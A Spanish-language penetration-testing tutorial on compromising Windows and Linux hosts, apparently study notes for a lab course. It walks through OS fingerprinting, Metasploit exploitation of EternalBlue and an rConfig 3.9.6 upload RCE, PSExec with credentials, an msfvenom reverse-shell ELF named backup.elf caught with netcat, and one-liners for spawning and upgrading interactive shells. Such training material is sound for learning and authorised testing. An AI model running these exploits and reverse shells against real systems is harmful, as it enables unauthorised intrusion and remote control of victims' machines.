# Infiltrar windows y linux

### Identificar el sistema operativo

Antes de intentar explotar un sistema, hay que determinar qué SO está corriendo para elegir el payload y el exploit correcto.

#### Fingerprinting por TTL (ICMP)

El valor TTL de las respuestas ICMP varía según el SO:

| SO                 | TTL típico |
| ------------------ | ---------- |
| Windows            | 128        |
| Linux              | 64         |
| Cisco / Networking | 255        |
| macOS              | 64         |

```bash
ping 192.168.1.50
# Si TTL ≈ 128 → probablemente Windows
# Si TTL ≈ 64  → probablemente Linux
```

#### Fingerprinting con Nmap

```bash
# Detección de SO
sudo nmap -v -O 192.168.1.50

# Resultado esperado en Windows:
# OS CPE: cpe:/o:microsoft:windows_10
# OS details: Microsoft Windows 10 1709 - 1909

# Con banner grabbing
sudo nmap -v 192.168.1.50 --script banner.nse

# Escaneo completo
nmap -sC -sV -A 192.168.1.50
```

### Infiltrar Windows

#### Vulnerabilidades Windows más explotadas

| Vulnerabilidad     | CVE            | Descripción                                                      |
| ------------------ | -------------- | ---------------------------------------------------------------- |
| **MS08-067**       | —              | Fallo SMB crítico, usado por Conficker y Stuxnet                 |
| **EternalBlue**    | MS17-010       | SMBv1 RCE, usado por WannaCry. Afecta Windows 2000 – Server 2016 |
| **PrintNightmare** | CVE-2021-34527 | RCE en Windows Print Spooler                                     |
| **BlueKeep**       | CVE-2019-0708  | RCE en RDP, afecta hasta Server 2008 R2                          |
| **Zerologon**      | CVE-2020-1472  | Fallo criptográfico en Netlogon → Domain Admin                   |
| **SeriousSam**     | CVE-2021-36934 | Usuarios sin privilegios leen la base de datos SAM               |

#### Ejemplo: EternalBlue con Metasploit (MS17-010)

```bash
# Paso 1: Verificar si el objetivo es vulnerable
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS 10.10.10.10
msf6 > run
# Si aparece "Host is likely VULNERABLE to MS17-010" → proceder

# Paso 2: Seleccionar y configurar el exploit
msf6 > search eternal
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 > set RHOSTS 10.10.10.10
msf6 > set LHOST 10.10.14.5
msf6 > set LPORT 4444
msf6 > exploit

# Resultado exitoso:
# [+] Overwrite complete... SYSTEM session obtained!
# meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```

#### Ejemplo: PSExec con credenciales (sin exploit)

```bash
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 10.10.10.10
msf6 > set SMBUser administrador
msf6 > set SMBPass contraseña
msf6 > set SHARE ADMIN$
msf6 > set LHOST 10.10.14.5
msf6 > exploit
```

#### Desde Meterpreter a shell del sistema

```bash
meterpreter > shell
# Abre cmd.exe en el sistema

# Verificar qué shell tenemos
# Si el prompt es C:\> → cmd.exe
# Si el prompt es PS C:\> → PowerShell
```

### Infiltrar Linux / Unix

#### Consideraciones antes de atacar Linux

Antes de explotar un sistema Linux conviene responder:

* ¿Qué distribución corre? (CentOS, Ubuntu, Debian...)
* ¿Qué shell y lenguajes de programación están disponibles?
* ¿Qué función tiene el servidor? (web, DB, NFS...)
* ¿Qué aplicación expone?
* ¿Hay CVEs conocidos para esa aplicación y versión?

#### Ejemplo: Explotar rConfig 3.9.6

```bash
# Paso 1: Enumerar con Nmap
nmap -sC -sV 10.10.10.10
# Resultado: puerto 80 con rConfig 3.9.6

# Paso 2: Buscar exploit en Metasploit
msf6 > search rconfig
# Resultado: exploit/linux/http/rconfig_vendors_auth_file_upload_rce

# Paso 3: Configurar y lanzar
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
msf6 > set RHOSTS 10.10.10.10
msf6 > set LHOST 10.10.14.5
msf6 > exploit

# El exploit:
# 1. Verifica la versión vulnerable de rConfig
# 2. Se autentica en la web
# 3. Sube un PHP payload como reverse shell
# 4. Lo ejecuta y elimina el archivo
# 5. Entrega una sesión Meterpreter
```

#### Entregar un payload MSFvenom a Linux

Cuando no hay exploit directo disponible pero se puede entregar un archivo:

```bash
# Generar el payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf > backup.elf

# Transferirlo al objetivo (cualquier método de file transfer)
# En el objetivo: darle permisos de ejecución y ejecutar
chmod +x backup.elf && ./backup.elf

# En el atacante: capturar la conexión
nc -lvnp 443
```

### Spawning Interactive Shells

Al obtener acceso a un sistema, frecuentemente la shell inicial es **no-TTY** — limitada, sin autocompletado, sin `su`, sin `sudo`. Hay varias formas de mejorarla a una shell interactiva completa.

#### Python

```bash
# Verificar si Python está disponible
which python python3

# Spawnear TTY con Python 2
python -c 'import pty; pty.spawn("/bin/sh")'

# Con Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### /bin/sh directamente

```bash
/bin/sh -i
```

#### Perl

```bash
perl -e 'exec "/bin/sh";'
```

#### Ruby

```bash
ruby -e 'exec "/bin/sh"'
```

#### AWK

```bash
awk 'BEGIN {system("/bin/sh")}'
```

#### Find

```bash
find / -name archivo -exec /bin/sh \; -quit
find . -exec /bin/sh \; -quit
```

#### Vim

```bash
vim -c ':!/bin/sh'
# O desde dentro de vim:
# :set shell=/bin/sh
# :shell
```

#### Mejorar la shell con stty

Una vez tenemos una TTY básica, mejorarla para tener historial, control de procesos y teclas de función:

```bash
# 1. Spawnear una TTY con Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Poner la shell en background (Ctrl+Z)
# 3. En el terminal local:
stty raw -echo; fg

# 4. De vuelta en la shell del objetivo:
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116  # ajustar a tu terminal
```

#### Verificar permisos disponibles

```bash
# Permisos de sudo del usuario actual
sudo -l

# Permisos de un archivo específico
ls -la /ruta/al/binario
```

> Si Python no está disponible, probar `script /dev/null -c bash` — también spawna una TTY en la mayoría de sistemas Linux modernos.

> En shells no interactivas, `sudo -l` puede no funcionar. Necesitas una TTY completa antes de intentarlo.
